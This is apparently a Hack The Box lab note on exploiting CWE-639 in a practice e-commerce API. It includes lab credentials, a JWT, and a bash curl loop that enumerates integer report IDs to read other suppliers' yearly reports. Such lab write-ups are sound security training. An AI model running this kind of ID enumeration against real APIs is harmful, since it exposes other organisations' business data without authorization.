## Authorization Bypass Through User-Controlled Key

The endpoint we will be practicing against is vulnerable to [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html).
### Scenario

The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester1@pentestercompany.com:HTBPentester1`, wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

Because the account belongs to a Supplier, we will utilize the `/api/v1/authentication/suppliers/sign-in` endpoint to sign in and obtain a JWT:

![](Broken%20Object%20Level%20Authorization-20260914-153639.png)

![](Broken%20Object%20Level%20Authorization-20260914-153643.png)

![](Broken%20Object%20Level%20Authorization-20260914-153724.png)

Let us then retrieve our current user's roles. After invoking the `/api/v1/roles/current-user` endpoint, it responds with the role `SupplierCompanies_GetYearlyReportByID`:

![](Broken%20Object%20Level%20Authorization-20260914-153738.png)

In the `Supplier-Companies` group, we find an endpoint related to the role `SupplierCompanies_GetYearlyReportByID` that accepts a GET parameter: `/api/v1/supplier-companies/yearly-reports/{ID}`:

![](Broken%20Object%20Level%20Authorization-20260914-153747.png)

When expanding it, we will notice that it requires the `SupplierCompanies_GetYearlyReportByID` role and accepts the `ID` parameter as an integer and not a `Guid`:

![](Broken%20Object%20Level%20Authorization-20260914-153757.png)

![](Broken%20Object%20Level%20Authorization-20260914-153801.png)

When trying other IDs, we still can access yearly reports of other supplier-companies, allowing us to access potentially sensitive business data:

![](Broken%20Object%20Level%20Authorization-20260914-153813.png)

![](Broken%20Object%20Level%20Authorization-20260914-153816.png)

```sh
3kjS@htb[/htb]$ for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X GET \
    "http://154.57.164.76:30865/api/v1/supplier-companies/yearly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc4OTM3Njg5OCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.aXbpX6ReYMsu0HFhBHgMAYsa8C_pNVvMY1I1Rv3zPH_KHYEvYmrDsxTsVlLhe1LSUdvAXbB1T_EFDWz67uJ-OQ' | jq
done
```
